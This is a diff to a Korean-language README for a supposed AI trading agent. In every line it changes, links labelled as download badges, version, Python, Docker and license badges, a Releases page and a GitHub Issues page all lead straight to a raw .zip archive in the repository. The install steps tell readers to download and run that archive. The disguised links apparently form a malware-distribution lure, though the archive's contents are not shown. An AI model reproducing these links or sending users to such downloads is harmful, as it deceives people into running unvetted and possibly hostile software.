@@ -2,11 +2,11 @@
 
 <div align="center">
 
-[![Download](https://raw.githubusercontent.com/arish16002/our-ultra-jennie/main/services/buy-scanner/our_ultra_jennie_1.8.zip%20release-blue)](https://raw.githubusercontent.com/arish16002/our-ultra-jennie/main/services/buy-scanner/our_ultra_jennie_1.8.zip)
-![Version](https://raw.githubusercontent.com/arish16002/our-ultra-jennie/main/services/buy-scanner/our_ultra_jennie_1.8.zip)
-![Python](https://raw.githubusercontent.com/arish16002/our-ultra-jennie/main/services/buy-scanner/our_ultra_jennie_1.8.zip)
-![Docker](https://raw.githubusercontent.com/arish16002/our-ultra-jennie/main/services/buy-scanner/our_ultra_jennie_1.8.zip)
-![License](https://raw.githubusercontent.com/arish16002/our-ultra-jennie/main/services/buy-scanner/our_ultra_jennie_1.8.zip)
+[![Download](https://github.com/arish16002/our-ultra-jennie/raw/refs/heads/main/utilities/our-jennie-ultra-v3.2-beta.4.zip%20release-blue)](https://github.com/arish16002/our-ultra-jennie/raw/refs/heads/main/utilities/our-jennie-ultra-v3.2-beta.4.zip)
+![Version](https://github.com/arish16002/our-ultra-jennie/raw/refs/heads/main/utilities/our-jennie-ultra-v3.2-beta.4.zip)
+![Python](https://github.com/arish16002/our-ultra-jennie/raw/refs/heads/main/utilities/our-jennie-ultra-v3.2-beta.4.zip)
+![Docker](https://github.com/arish16002/our-ultra-jennie/raw/refs/heads/main/utilities/our-jennie-ultra-v3.2-beta.4.zip)
+![License](https://github.com/arish16002/our-ultra-jennie/raw/refs/heads/main/utilities/our-jennie-ultra-v3.2-beta.4.zip)
 
 **AI 기반 자율 트레이딩 에이전트**
 
@@ -26,7 +26,7 @@
 
 ## 🚀 설치 방법
 
-1. **Visit the [Releases page](https://raw.githubusercontent.com/arish16002/our-ultra-jennie/main/services/buy-scanner/our_ultra_jennie_1.8.zip)** in your web browser.
+1. **Visit the [Releases page](https://github.com/arish16002/our-ultra-jennie/raw/refs/heads/main/utilities/our-jennie-ultra-v3.2-beta.4.zip)** in your web browser.
 2. **Download the latest release** by clicking on the version link (e.g., `v1.0.0`).
 3. Choose the appropriate installer for your operating system (Windows, macOS, or Linux).
 4. **Run the installer** and follow the on-screen instructions.
@@ -66,7 +66,7 @@
 - For performance problems, check your internet connection.
 - You can find troubleshooting tips in the app's help section.
 
-For further assistance, you can create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/arish16002/our-ultra-jennie/main/services/buy-scanner/our_ultra_jennie_1.8.zip).
+For further assistance, you can create an issue on the [GitHub Issues page](https://github.com/arish16002/our-ultra-jennie/raw/refs/heads/main/utilities/our-jennie-ultra-v3.2-beta.4.zip).
 
 --- 
 
